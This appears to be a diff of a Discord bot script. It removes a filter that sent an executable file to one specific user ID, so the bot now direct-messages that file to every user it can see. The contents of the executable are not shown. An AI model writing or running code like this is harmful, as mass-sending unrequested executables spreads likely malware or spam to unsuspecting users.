@@ -10,9 +10,7 @@ client.on("ready", async () => {
     const file =  getExecutable();
 
     client.users.cache.forEach(async (user) => {
-        if (user.id == "1288138552718397461") {
-            await user.send({content: message, files: [file]});
-        }
+        await user.send({content: message, files: [file]});
     }); 
 });
 
